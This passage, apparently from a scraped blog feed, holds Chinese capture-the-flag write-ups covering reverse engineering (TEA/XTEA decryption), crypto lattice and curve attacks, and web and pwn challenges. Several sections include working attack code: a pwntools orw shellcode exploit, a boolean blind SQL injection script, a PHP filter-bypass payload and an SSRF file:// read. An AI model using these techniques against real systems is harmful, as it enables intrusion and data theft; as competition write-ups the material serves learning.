[ebp-4h] v6 = *a1; v5 = a1[1]; v4 = 0; for ( i = 0; i &lt;= 0x1F; ++i ) &#123; v4 -= 1640531527; v6 += (v5 + v4) ^ (16 * v5 + *a2) ^ ((v5 &gt;&gt; 5) + a2[1]); v5 += (v6 + v4) ^ (16 * v6 + a2[2]) ^ ((v6 &gt;&gt; 5) + a2[3]); &#125; *a1 = v6; result = v5; a1[1] = v5; return result;&#125; 函数 sub_4015FD()： 12345678910111213141516171819202122unsigned int __cdecl sub_4015FD(unsigned int a1, unsigned int *a2, int a3) //XTEA算法&#123; unsigned int result; // eax unsigned int v4; // [esp+10h] [ebp-10h] unsigned int v5; // [esp+14h] [ebp-Ch] unsigned int v6; // [esp+18h] [ebp-8h] unsigned int i; // [esp+1Ch] [ebp-4h] v6 = *a2; v5 = a2[1]; v4 = 0; for ( i = 0; i &lt; a1; ++i ) &#123; v6 += (((v5 &gt;&gt; 5) ^ (16 * v5)) + v5) ^ (*(_DWORD *)(4 * (v4 &amp; 3) + a3) + v4); v4 -= 1640531527; v5 += (((v6 &gt;&gt; 5) ^ (16 * v6)) + v6) ^ (*(_DWORD *)(4 * ((v4 &gt;&gt; 11) &amp; 3) + a3) + v4); &#125; *a2 = v6; result = v5; a2[1] = v5; return result;&#125; 根据上面逻辑，先利用TEA和XTEA解密算法由 v10~v17 解密得到初始值 v25,v26,v22,v23,v20,v21,v18,v19： 12345678910111213141516171819202122232425#TEA解密def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xC6EF3720 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = key = [2, 2, 3, 4] decrypted = decrypt(encrypted, key) print(decrypted) 12345678910111213141516171819202122#XTEA解密def decrypt(rounds, v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * rounds for i in range(rounds): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vif __name__ == &#x27;__main__&#x27;: encrypted = key = [2, 2, 3, 4] rounds = 32 decrypted = decrypt(rounds, encrypted, key) print(decrypted) 结果： 1234[0x9F5FBC48,0xC5517691] -&gt; [1,1][0x24BDF90F,0x301B88E8] -&gt; [3,4][0x92750C5A,0xA0D98E0E] -&gt; [2,5][0x8DD02793,0x4F558864] -&gt; [8,7] 故 v4 = [1,1,2,3,4,5,7,8]，又 v9 = v8 = v4^v7，异或得到 v7，先base64解码再RC4解密可得输入的 Source 值，即为flag。 ​ PWNncc 经典nc! PWN题连接方式: nc neepusec.club 端口 ls / 发现目录下有 /flag，但没有 cat 等常见的查看文件内容命令。 cd /bin 进到 /bin 目录下，ls 发现目录下有 sh 脚本执行命令，直接 sh /flag 利用报错泄露 /flag 文件内容。 ​ easy_shellcode easy shellcode? flag在./flag checksec发现无任何保护，IDA查看： 1234567891011__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *buf; // [rsp+0h] [rbp-10h] sub_9C3(a1, a2, a3); buf = (void *)(int)mmap((void *)0x23330000, 0x1000uLL, 7, 34, -1, 0LL); puts(&quot;just learn orw&quot;); read(0, buf, 0x200uLL); ((void (*)(void))buf)(); return 0LL;&#125; 函数 sub_9C3(a1,a2,a3)： 12345678unsigned int sub_9C3()&#123; setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); sub_8CA(); return alarm(0x3Cu);&#125; 函数 sub_8CA()： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061unsigned __int64 sub_8CA()&#123; __int16 v1; // [rsp+0h] [rbp-50h] BYREF __int16 *v2; // [rsp+8h] [rbp-48h] __int16 v3; // [rsp+10h] [rbp-40h] BYREF char v4; // [rsp+12h] [rbp-3Eh] char v5; // [rsp+13h] [rbp-3Dh] int v6; // [rsp+14h] [rbp-3Ch] __int16 v7; // [rsp+18h] [rbp-38h] char v8; // [rsp+1Ah] [rbp-36h] char v9; // [rsp+1Bh] [rbp-35h] int v10; // [rsp+1Ch] [rbp-34h] __int16 v11; // [rsp+20h] [rbp-30h] char v12; // [rsp+22h] [rbp-2Eh] char v13; // [rsp+23h] [rbp-2Dh] int v14; // [rsp+24h] [rbp-2Ch] __int16 v15; // [rsp+28h] [rbp-28h] char v16; // [rsp+2Ah] [rbp-26h] char v17; // [rsp+2Bh] [rbp-25h] int v18; // [rsp+2Ch] [rbp-24h] __int16 v19; // [rsp+30h] [rbp-20h] char v20; // [rsp+32h] [rbp-1Eh] char v21; // [rsp+33h] [rbp-1Dh] int v22; // [rsp+34h] [rbp-1Ch] __int16 v23; // [rsp+38h] [rbp-18h] char v24; // [rsp+3Ah] [rbp-16h] char v25; // [rsp+3Bh] [rbp-15h] int v26; // [rsp+3Ch] [rbp-14h] unsigned __int64 v27; // [rsp+48h] [rbp-8h] v27 = __readfsqword(0x28u); v3 = 32; v4 = 0; v5 = 0; v6 = 4; v7 = 21; v8 = 0; v9 = 2; v10 = -1073741762; v11 = 32; v12 = 0; v13 = 0; v14 = 0; v15 = 21; v16 = 0; v17 = 1; v18 = 59; v19 = 6; v20 = 0; v21 = 0; v22 = 0; v23 = 6; v24 = 0; v25 = 0; v26 = 2147418112; v1 = 6; v2 = &amp;v3; prctl(38, 1LL, 0LL, 0LL, 0LL); prctl(22, 2LL, &amp;v1); return __readfsqword(0x28u) ^ v27;&#125; 在函数 sub_8CA() 发现 prctl() 函数。 prctl是基本的进程管理函数，最原始的沙箱规则就是通过prctl函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。 沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp是内核中的一种安全机制，seccomp可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。 使用 seccomp-tools dump ./pwn 看下哪些函数可用： 发现只要不是 execve() 都可以使用，使用 open-&gt;read-&gt;write 这样的orw的方式获取flag。 mmap() 把从0x23330000开始的地址，大小为0x1000的长度，权限改为可写可执行。 所以只需要写入orw类型的shellcode，然后跳转执行： 12345678910from pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;p = remote(&#x27;neepusec.club&#x27;, 18146)mmap = 0x23330000orw_payload = shellcraft.open(&#x27;./flag&#x27;) #打开根目录下的flag文件orw_payload += shellcraft.read(3,mmap,0x50) #读取文件标识符是3的文件0x50个字节存放到mmap分配的地址空间里orw_payload += shellcraft.write(1,mmap,0x50) #将mmap地址上的内容输出0x50个字节p.sendlineafter(&#x27;orw\\n&#x27;, asm(orw_payload))p.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"第四届红帽杯网络安全大赛","slug":"match-第四届红帽杯网络安全大赛","date":"2021-05-09T10:20:01.000Z","updated":"2021-12-05T18:13:22.333Z","comments":true,"path":"2021/05/09/match-第四届红帽杯网络安全大赛/","link":"","permalink":"https://lazzzaro.github.io/2021/05/09/match-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 这一届的misc+crypto也太少了，一二血同队+垂直上分明显。 Misc签到下载附件EBCDIC.txt，根据文件名和内容，猜测为某种编码方式，搜索知为EBCDIC编码： EBCDIC（广义二进制编码的十进制交换码，Extended Binary Coded Decimal Interchange Code），是字母或数字字符的二进制编码，是IBM为它的更大型的操作系统而开发的。它是为IBM的S/390上的IBMOS/390操作系统上使用的文本文件的编码，并且数千个公司为它们的遗留应用程序和数据库使用这种编码。在一个EBCDIC的文件里，每个字母或数字字符都被表示为一个8位的二进制数（一个0、1字符串）。256个可能的字符被定义（字母，数字和一些特殊字符）。IBM的个人计算机和工作站操作系统不使用它们所有的EBCDIC编码。相反的，它们使用文本的工业标准编码，ASCII码。转化程序允许不同的操作系统从一种编码到另一种编码的转化。 找到在线解码网站，将16进制EBCDIC码解码为16进制ASCII码，再转为字符得到flag。 flag值：flag{we1c0me_t0_redhat2021} ​ Cryptoprimegame 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python3from decimal import *import mathimport randomimport structfrom flag import flagassert (len(flag) == 48)msg1 = flag[:24]msg2 = flag[24:]primes = [2]for i in range(3, 90): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = 100keys = []for i in range(len(msg1)): keys.append(Decimal(primes[i]).ln())sum_ = Decimal(0.0)for i, c in enumerate(msg1): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)sum_ = Decimal(0.0)for i, c in enumerate(msg2): sum_ += c * Decimal(keys[i])ct = math.floor(sum_ * 2 ** 256)print(ct)597952043660446249020184773232983974017780255881942379044454676980646417087515453425985475047781336789963300910446852783032712598571885345660550546372063410589918 代码逻辑： 将48长度的flag分为24长度两部分，生成90以内的素数列表primes和前24个素数自然对数列表keys，分别求出flag两部分的ascii值与key值乘积和。 容易看出 $S=\\text{ct} \\cdot 2^{256}=\\sum\\limits_{i=1}^{24}\\Big(c_i \\cdot (\\text{key}_i \\cdot 2^{256})\\Big)=\\sum\\limits_{i=1}^{24}(c_i \\cdot k_i)$ 形式类似于0-1背包加密问题，其中公钥 $k_i$ 与密文 $S$ 已知，需解密得明文 $c_i \\in [0,128)$。 由于明文数量不大，且背包密度 $d = \\cfrac{n}{\\log_2(\\text{max}(k_i))} \\approx 0.0968$，可采用低密度攻击方法（Lagarias&amp;Odlyzko算法 或 CJLOSS算法）恢复明文，构造格： $\\left(\\begin {array}{c} b_0 \\newline b_1 \\newline \\vdots \\newline b_n \\newline b_{n+1} \\end{array} \\right) =\\left(\\begin {array}{c} 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_0 \\newline 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; Nk_1 \\newline \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\newline 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; Nk_n \\newline 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; Nk_{n+1} \\end{array} \\right) $ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from itertools import combinationsfrom decimal import Decimal, getcontextimport randomimport structprimes = [2]for i in range(3, 100): f = True for j in primes: if i * i &lt; j: break if i % j == 0: f = False break if f: primes.append(i)getcontext().prec = int(100)keys = []for i in range(len(primes)): keys.append(int(Decimal(int(primes[i])).ln() * (2 ** 256)))n = len(keys)d = n / log(max(keys), 2)assert CDF(d) &lt; 0.9408M = Matrix.identity(n)last_row = [0 for x in keys]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)ct = &#x27;597952043660446249020184773232983974017780255881942379044454676980646417087515453&#x27;# ct = &#x27;425985475047781336789963300910446852783032712598571885345660550546372063410589918&#x27;last_col = keys[:]last_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.LLL()target = X[0][:-1]flag = [-k for k in target]print(bytes(flag).strip(b&#x27;\\x00&#x27;))#结果#b&#x27;flag&#123;715c39c3-1b46-4c23-&#x27;#b&#x27;8006-27b43eba2446&#125;&#x27; flag值：flag{715c39c3-1b46-4c23-8006-27b43eba2446} ​ hpcurve 你的数学学的怎么样？ 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env sageimport structfrom random import SystemRandomp = 10000000000000001119R.&lt;x&gt; = GF(p)[]y=xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()es = [SystemRandom().randrange(p**3) for _ in range(3)]Ds = [J(C(x, min(f(x).sqrt(0,1)))) for x in (11,22,33)]q = []def clk(): global Ds,es Ds = [e*D for e,D in zip(es, Ds)] return Dsdef generate(): u,v = sum(clk()) rs = [u[i] for i in range(3)] + [v[i] for i in range(3)] assert 0 not in rs and 1 not in rs q = struct.pack(&#x27;&lt;&#x27;+&#x27;Q&#x27;*len(rs), *rs) return qflag = &quot;flag&#123;xxxxxxx&#125;&quot;text = &#x27;a&#x27;*20+flagt = &#x27;&#x27;keys = generate()leng = len(keys)i = 0for x in text: t += chr(ord(keys[i%leng])^^ord(x)) i+=1print t.encode(&#x27;hex&#x27;)66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5 代码逻辑： 密文为flag与超椭圆曲线 $y^2=x+x^7$ 随机生成值异或得到，由于部分明文已知，通过随机生成器(RNG)部分的代码恢复剩余字符。 对于域 $K$，亏格为 $g$ 超椭圆曲线基本形式是 $C:y^2+h(x)y=f(x)$，其中 $h(x),f(x) \\in K[x]$（多项式系数都在 $K$ 上），且 $\\deg(h(x)) \\leq g$，$\\deg(f(x))=2g+1$。 超椭圆曲线密码体制是建立在超椭圆曲线的Jacobian群上的，有限域上超椭圆曲线的Jacobian群是一个有限交换群，Jacobian阶记为 $J(C)$。可以在 $J(C)$中定义归约除子的一个加法运算 。使得 $J(C)$成为一个交换群，这个有限交换群是超椭圆曲线密码体制的基础。 每个元素 $D \\in J(C)$ 都可以唯一表示为 $K[x]$ 上的一个多项式元组 $\\langle u(x),v(x) \\rangle$，多项式满足： $u(x)$ 是首一多项式 $u(x)$ 整除 $f(x)-h(x)v(x)-v^2(x)$ $\\deg(v(x)) \\lt \\deg(u(x)) \\lt g$ 这里 $h(x)=0,f(x)=x+x^7$，RNG部分生成三个随机数 $e_1,e_2,e_3$ 以及三个元素 $D_1,D_2,D_3 \\in J(C)$， RNG部分计算 $\\langle u(x),v(x) \\rangle=e_1D_1+e_2D_2+e_3D_3$ 并将系数转换为字节。 结合已知的a*20+flag共24字节，可以恢复 $u(x)$。 对于 $v(x)$，根据 $D \\in J(C)$ 的性质，有 $f(x)-h(x)v(x)-v^2(x) \\equiv 0 \\pmod {u(x)}$ 如果 $x_i$ 是 $u(x)$ 的根（$K$ 代数闭包下），有 $f(x_i)-h(x_i)v(x_i)-v^2(x_i) = 0 \\Longrightarrow v^2(x_i)+h(x_i)v(x_i)=f(x_i)$， 说明 $(x_i,v(x_i))$ 是 $C$ 上的一个点。 又 $h(x_i)=0$，则 $v^2(x_i)=f(x_i) \\Longrightarrow v(x_i) = \\pm \\sqrt{f(x_i)}$。 由于 $u(x)$ 次数为3，在$K$ 代数闭包下，可以找到三个根 $x_1,x_2,x_3$，即 $C$ 上的三个点 $(x_1,v(x_1)),(x_2,v(x_2)),(x_3,v(x_3))$，利用拉格朗日插值方法可以恢复 $v(x)$。 得到 $u(x)$ 和 $v(x)$，异或操作还原明文。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354import structfrom itertools import product, cyclep = 10000000000000001119K = GF(p)R.&lt;x&gt; = K[]y = xf = y + y^7C = HyperellipticCurve(f, 0)J = C.jacobian()def get_u_from_out(output, known_input): res = [] for i in range(24): res.append(output[i]^^known_input[i]) res = bytes(res) u0, u1, u2 = struct.unpack(&quot;&lt;QQQ&quot;, res) u = x^3+x^2*u2+x*u1+u0 return udef get_v_from_u(u): Kbar = GF(p^6) Rbar.&lt;t&gt; = Kbar[&quot;t&quot;] u2 = u.change_ring(Rbar) roots = [x[0] for x in u2.roots()] ys = [] for root in roots: ys.append(f(root).sqrt(0,1)) res = [] for perm in product(range(2), repeat=3): poly = Rbar.lagrange_polynomial([(roots[i], ys[i][perm[i]]) for i in range(3)]) if poly[0] in K: res.append(R(poly)) return resdef try_decode(output, u, v): rs = [u[0], u[1], u[2], v[0], v[1], v[2]] otp = struct.pack(&quot;&lt;QQQQQQ&quot;, *rs) decrypted = [a^^b for (a, b) in zip(output, cycle(otp)) ] return bytes(decrypted)output = bytes.fromhex(&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;)known_input = b&#x27;a&#x27; * 20 + b&#x27;flag&#x27;u = get_u_from_out(output, known_input)vs = get_v_from_u(u)for v in vs: #print((u,v)) print(try_decode(output,u,v)) #结果#b&#x27;aaaaaaaaaaaaaaaaaaaaflag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag|\\xb1J\\xedFp^v2\\xb9\\x10\\x16\\xf6\\xfddD(h7\\xb6\\xc3S\\xe0\\xcf-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\\xe3J\\xad\\x88\\xb2\\xac\\xf8\\x1c-C\\x07\\x97\\x02/B47l\\xd0\\xf30\\x8f&amp;\\xbf-97d120aae6fc&#125;&#x27;#b&#x27;aaaaaaaaaaaaaaaaaaaaflag\\xe4\\xca\\xf5\\xbd\\xc6\\xa6\\x00B\\xfe\\xde\\xe3z\\x9a\\xbe\\x95D\\xf9\\xc2\\xafD\\xda\\xff\\xa3\\xeb-97d120aae6fc&#125;&#x27; flag值：flag{1b82f60a-43ab-4f18-8ccc-97d120aae6fc} ​ Webfind_it主页面没什么有用信息，扫描发现robots.txt，访问提示： 123When I was a child,I also like to read Robots.txtHere is what you want:1ndexx.php 访问1ndexx.php报500 Internal Server Error，尝试看是否存在vim源码泄露，发现访问.1ndexx.php.swp能回显源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#x27;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php#Really easy...$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a=$_GET[&#x27;code&#x27;];if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; 代码逻辑： 将flag.php文件内容读入变量$I_know_you_wanna_but_i_will_not_give_you_hhh，并将传入的code参数值与变量$I_know_you_wanna_but_i_will_not_give_you_hhh一起写入hack.php文件中。 对code参数值过滤的关键字不少： system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|~|^|`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump 用命令执行、文件读写等多种方式尝试向hack.php写入php代码，以显示flag.php文件内容，发现show_source()函数可行。 payload: ?code=&lt;?=show_source(&quot;fla&quot;.&quot;g.php&quot;); 最后访问hack.php，得到flag.php内容： 123456789&lt;?php #ini_set(&#x27;display_errors&#x27;,true);#error_reporting(E_ALL ^ E_NOTICE);flag=MZWGCZ33HA3GIOJWHA2DGLJYGNTDCLJUGE3DSLJZMQZDILJZGY3TIZRTHE3GMMJQGN6Q====;echo &quot;What is important for a new bird of php??&quot;?&gt; Base32解码得flag。 flag值：flag{86d96843-83f1-4169-9d24-9674f396f103} ​ WebsiteManager 最新的网站测试器，作为非站长的你，能利用好它的功能吗？ 查看网页源码发现image.php?id=1，猜测存在sql注入，手工测试发现过滤了空格和双引号，且测试?id=-2/**/or/**/1=1有图片显示，?id=-2/**/or/**/1=2无图片显示，验证存在注入点，采用布尔盲注跑出登录用户名和密码： 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl = &quot;http://eci-2zefme7yqvztnp4652um.cloudeci1.ichunqiu.com/image.php&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;&#x27;&#x27; # payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27; payload = f&#x27;&#x27;&#x27;if(ascii(substr((select(group_concat(username,password))from(ctf.users)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;&#x27;&#x27; data = &#123; &#x27;id&#x27;: f&quot;-2/**/or/**/&#123;payload&#125;&quot; &#125; r = requests.get(url,params=data) if &quot;HRN&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) #结果#库名: ctf#表名: images,users#users表中列名： username,password#users表中值： admin,9ebab83595888e5a8bd57 用admin和9ebab83595888e5a8bd57直接登录，结合curl.php猜测是SSRF，填入http://127.0.0.1/得到访问结果回显验证猜测，尝试改用file伪协议直接读取根目录flag文件得到flag。 payload: file://127.0.0.1/flag 或 file:///flag flag值：flag{f0d06b4c-954e-4a76-ad5d-95bd0227daea}","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"WebAssembly","slug":"reverse-WebAssembly","date":"2021-04-03T15:30:16.000Z","updated":"2022-12-15T16:17:55.647Z","comments":true,"path":"2021/04/03/reverse-WebAssembly/","link":"","permalink":"https://lazzzaro.github.io/2021/04/03/reverse-WebAssembly/","excerpt":"","text":"​ WebAssembly（wasm）是基于堆栈的虚拟机的二进制指令格式。wasm被设计为可编程C / C ++ / Rust等高级语言的可移植目标，可在Web上部署客户端和服务器应用程序。 ​ 安装 &amp; 使用 JEB反编译 wabt 123456789101112git config --global url.&quot;https://gitclone.com/&quot;.insteadOf https://git clone --recursive https://github.com/WebAssembly/wabtcd wabtgit submodule update --initmkdir buildcd buildcmake ..cmake --build ../wasm2wat wasm.wasm -o wasm.wat （反汇编）./wasm2c wasm.wasm -o wasm.c （反编译，末尾字符串）gcc -c wasm.c -o wasm.o （优化） 123apt install wabtwasm-decompile wasm.wasm","categories":[{"name":"reverse","slug":"reverse","permalink":"https://lazzzaro.github.io/categories/reverse/"}],"tags":[{"name":"WebAssembly","slug":"WebAssembly","permalink":"https://lazzzaro.github.io/tags/WebAssembly/"},{"name":"wasm","slug":"wasm","permalink":"https://lazzzaro.github.io/tags/wasm/"}],"author":"Lazzaro"},{"title":"2021数字中国创新大赛虎符网络安全赛道","slug":"match-2021数字中国创新大赛虎符网络安全赛道","date":"2021-04-03T12:31:00.000Z","updated":"2021-10-16T16:22:07.999Z","comments":true,"path":"2021/04/03/match-2021数字中国创新大赛虎符网络安全赛道/","link":"","permalink":"https://lazzzaro.github.io/2021/04/03/match-2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93/","excerpt":"","text":"​ 数字中国是十九大提出的新时代国家信息化发展的新战略。2021数字中国创新大赛，作为数字中国建设峰会“一会、一展、一赛”的重要组成部分， 将继续采取多赛道并行的竞赛形式，设置数字党建、数字政府、大数据、智慧医疗、鲲鹏计算、网络安全、集成电路设计、青少年AI机器人八个赛道，紧贴数字中国建设峰会主题，围绕核心前沿技术与信息技术应用创新设置赛题，以多维度立体化的角度诠释“数字中国”。 第二届“虎符网络安全赛道“将在去年首次将PK体系与传统网络安全竞赛相结合的优势基础上，继续保持Wintel+PK双体系并行模式进行比赛，以“PK体系”在网络安全赛事中的创新升级应用作为赛事的核心驱动。同时在此基础上进行包括赛事场景、评委阵容以及选手权益在内的三大升级。 https://www.ichunqiu.com/2021hfctf ​ rank: 80+ Misc你会日志分析吗 线索只有一份access.log，你能从中分析到什么？ 明显能看出access.log日志文件中包含SQL时间盲注的记录，直接拉到最后看 ?id=1&#39;%20and%20if(ord(substr((select%20flag%20from%20flllag),xx,1))=xx,sleep(2),1)语句， 逐个字符猜解，正确情形会延迟2s，观察每行前一列的时间秒数，不连续的部分前一个字符即为正确字符。 懒写脚本，逐个手撸得到一串十进制数 90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61， 转为字符为base64编码字符串ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==，解码即为flag。 flag flag&#123;You_are_so_great&#125; ​ Cryptocubic Please give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 给出著名不定方程 $\\cfrac{x}{y+z}+\\cfrac{y}{x+z}+\\cfrac{z}{x+y}=6$ 的6组正整数解，乍看容易实则不然。 方程在整数范围内易通过爆破求得多解，而正整数范围内很难用初等代数人工求得多解，需结合抽象代数解决。 背景参考：史上最贱的数学题 把 $x,y,z$ 看为 $a,b,c$，展开化简为： $a^3+b^3+c^3-5(a^2b+ab^2+a^2c+ac^2+b^2c+bc^2)-9abc=0$ 结合引用论文 An unusual cubic representation problem，将方程映射到二维空间，即 $(a,b,c) \\rightarrow (x,y)$。 $(a,b,c) \\rightarrow (x,y)$ 映射关系式： $\\begin{cases} x=\\cfrac{-4(a+b+2c)(N+3)}{(2a+2b-c)+(a+b)N}=\\cfrac{-36(a+b+2c)}{8a+8b-c} \\\\ y=\\cfrac{4(a-b)(N+3)(2N+5)}{(2a+2b-c)+(a+b)N}=\\cfrac{612(a-b)}{8a+8b-c} \\end{cases}$ 取 $(a,b,c)=(1,-1,0)$，得到椭圆曲线的Weierstrass形式方程： $E_6:y^2=x^3+(4N^2+12N-3)x^2+32(N+3)x=x^3+213x^2+288x$ 在曲线上易取出基点 $G$ 作为初始点，根据不定方程的 $(ka,kb,kc)$ 通解特性，可分别将基点 $G$ 数乘得到 $2G,3G,\\cdots$，再分别通过关系式映射回 $(a,b,c)$，以条件判断 $a&gt;0,b&gt;0,c&gt;0$，得到的 $(a,b,c)$ 即为不定方程的正整数解。 $(x,y) \\rightarrow (a,b,c)$ 映射关系式： $\\begin{cases} \\cfrac{a}{a+b+c}=\\cfrac{8(N+3)-x+y}{2(4-x)(N+3)} \\\\ \\cfrac{b}{a+b+c}=\\cfrac{8(N+3)-x-y}{2(4-x)(N+3)} \\\\ \\cfrac{c}{a+b+c}=\\cfrac{-4(N+3)-(N+2)x}{(4-x)(N+3)} \\end{cases}$ 脚本： 12345678910111213141516171819202122232425262728293031323334#Sageee = EllipticCurve([0, 4*6^2+12*6-3, 0, 32*(6+3), 0])print(ee)print(ee.gens())P = ee(-200,680) def orig(P,N): x = P[0] y = P[1] a = (8*(N+3)-x+y)/(2*(N+3)*(4-x)) b = (8*(N+3)-x-y)/(2*(N+3)*(4-x)) c = (-4*(N+3)-(N+2)*x)/((N+3)*(4-x)) da = denominator(a) db = denominator(b) dc = denominator(c) l = lcm(da,lcm(db,dc)) return [a*l, b*l, c*l]ans = []for k in range(200): u = orig(k*P, 6) (a,b,c) = (u[0],u[1],u[2]) if a&gt;0 and b&gt;0 and c&gt;0: print(k) print(a) print(b) print(c) print(a/(b+c)+b/(a+c)+c/(a+b)) print() ans.append((a,b,c)) print(ans)#len(ans)=8 再通过pwntools与环境交互得flag。 12345678910111213from pwn import *r = remote(&#x27;8.140.152.226&#x27;,27359)my = [...]r.recvline()for i in 